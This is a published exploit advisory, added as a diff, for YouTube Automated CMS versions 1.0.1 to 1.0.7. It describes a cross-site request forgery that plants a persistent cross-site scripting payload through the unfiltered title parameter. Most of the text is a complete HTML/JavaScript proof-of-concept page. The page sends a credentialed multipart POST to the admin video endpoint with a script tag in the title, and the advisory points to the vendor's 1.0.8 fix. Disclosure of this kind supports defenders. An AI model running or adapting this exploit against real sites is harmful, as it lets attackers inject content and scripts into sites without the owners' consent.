@@ -1,0 +1,98 @@
+# Exploit Title: YouTube Automated CMS 1.0.1 / 1.0.7 - CSRF to Persistent XSS
+# Date: 14 October 2016
+# Exploit Author: Arbin Godar
+# Website : ArbinGodar.com
+# Software Link: https://codecanyon.net/item/youtube-automated-cms/12021939
+# Version: 1.0.1 to 1.0.7
+
+----------------------------------------------------------------------------------------------------------------------
+
+Description:
+An Attackers are able to execute js and perform CSRF on web
+application using YouTube Automated CMS which allow an attacker to
+create a post when an authenticated user/admin browses a special
+crafted web page. All the process was also possible without any
+authenticated user/admin for more info watch the below PoC Video.
+
+The title parameter was not filtering special characters mean
+vulnerable to XSS. So, now by creating CSRF exploit code for posting
+an article with XSS alert JS payload as title of post. Now if the
+attacker is able to perform CSRF attack sucessfully then XSS will be
+triggered when someone opens the site using YouTube Automated CMS.
+
+CSRF Exploit Code: 
+
+<html>
+  <body>
+   <title>[Youtube Automated CMS] CSRF to Persistent XSS</title>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://victim.com/admin/videos.php?case=add&youtube_video_url=https://sophosnews.files.wordpress.com/2016/02/anonymous.jpg", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------1681718590736");
+        xhr.withCredentials = true;
+        var body = "-----------------------------1681718590736\r\n" + 
+          "Content-Disposition: form-data; name=\"title\"\r\n" + 
+          "\r\n" + 
+          "\"\x3e\x3cscript\x3ealert(/XSSed-By-Arbin/)\x3c/script\x3e\r\n" + 
+          "-----------------------------1681718590736\r\n" + 
+          "Content-Disposition: form-data; name=\"details\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------1681718590736\r\n" + 
+          "Content-Disposition: form-data; name=\"category_id\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------1681718590736\r\n" + 
+          "Content-Disposition: form-data; name=\"thumbnail\"; filename=\"\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------1681718590736\r\n" + 
+          "Content-Disposition: form-data; name=\"published\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------1681718590736\r\n" + 
+          "Content-Disposition: form-data; name=\"duration\"\r\n" + 
+          "\r\n" + 
+          "70\r\n" + 
+          "-----------------------------1681718590736\r\n" + 
+          "Content-Disposition: form-data; name=\"image\"\r\n" + 
+          "\r\n" + 
+          "https://sophosnews.files.wordpress.com/2016/02/anonymous.jpg\r\n" + 
+          "-----------------------------1681718590736\r\n" + 
+          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------1681718590736--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <br><br><br>
+    <center>
+    <h2><font color="red">[Youtube Automated CMS] CSRF to Persistent XSS by Arbin</font></h2>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </center>
+  </body>
+</html>
+
+PoC Video: https://youtu.be/cCtThSquNSk
+
+Vendor Shouted Urgent Update:
+http://wpsup.com/products/youtube-automated-cms/urgent-update-1-0-8-fix-security-bugs/
+
+Fix/Patch: Update to latest version.
+
+----------------------------------------------------------------------------------------------------------------------
+
+Regards,
+Arbin Godar
+https://twitter.com/arbingodar
